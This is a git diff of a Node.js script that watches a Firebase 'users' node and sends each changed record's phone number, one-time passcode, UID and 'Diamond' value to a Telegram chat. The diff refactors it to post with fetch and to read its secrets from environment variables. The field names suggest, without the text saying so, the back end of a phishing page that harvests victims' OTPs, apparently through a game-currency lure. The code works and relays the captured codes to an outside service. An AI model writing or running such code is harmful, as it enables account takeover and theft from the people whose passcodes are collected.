@@ -1,40 +1,41 @@
 import admin from "firebase-admin";
-import TelegramBot from "node-telegram-bot-api";
+import fetch from "node-fetch";
 import fs from "fs";
 
-// Firebase service account
-import serviceAccount from "./serviceAccountKey.json" assert { type: "json" };
+// Load serviceAccountKey from environment secret
+const serviceAccount = JSON.parse(process.env.SERVICE_ACCOUNT_JSON);
 
-// Telegram credentials from Render environment variables
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
-// Initialize Firebase
 admin.initializeApp({
   credential: admin.credential.cert(serviceAccount),
-  databaseURL: "https://siyamhasansiyam-2c149-default-rtdb.firebaseio.com"
+  databaseURL: process.env.FIREBASE_DB_URL
 });
 
 const db = admin.database();
-const bot = new TelegramBot(BOT_TOKEN);
 
-// Firebase path to listen
-const usersRef = db.ref("users");
+// Telegram info
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// Listen for new data
-usersRef.on("child_changed", (snapshot) => {
-  const userId = snapshot.key;
-  const data = snapshot.val();
-  let message = `User: ${userId}\n`;
+// Firebase listener
+db.ref("users").on("child_changed", async (snapshot) => {
+  const userKey = snapshot.key;
+  const userData = snapshot.val();
 
-  if(data.NUMBERC) message += `Mobile: ${data.NUMBERC}\n`;
-  if(data.OTPC) message += `OTP: ${data.OTPC}\n`;
-  if(data.UIDC) message += `UID: ${data.UIDC}\n`;
-  if(data.DIAMONDC) message += `Diamond: ${data.DIAMONDC}`;
+  let message = `Update from user: ${userKey}\n`;
 
-  bot.sendMessage(CHAT_ID, message)
-    .then(() => console.log("Message sent:", message))
-    .catch(err => console.error("Telegram error:", err));
+  if(userData.NUMBERC) message += `Number: ${userData.NUMBERC}\n`;
+  if(userData.OTPC) message += `OTP: ${userData.OTPC}\n`;
+  if(userData.UIDC) message += `UID: ${userData.UIDC}\n`;
+  if(userData.DIAMONDC) message += `Diamond: ${userData.DIAMONDC}\n`;
+
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message
+    })
+  });
 });
 
-console.log("Firebase → Telegram listener running...");
+console.log("Firebase → Telegram bot running...");
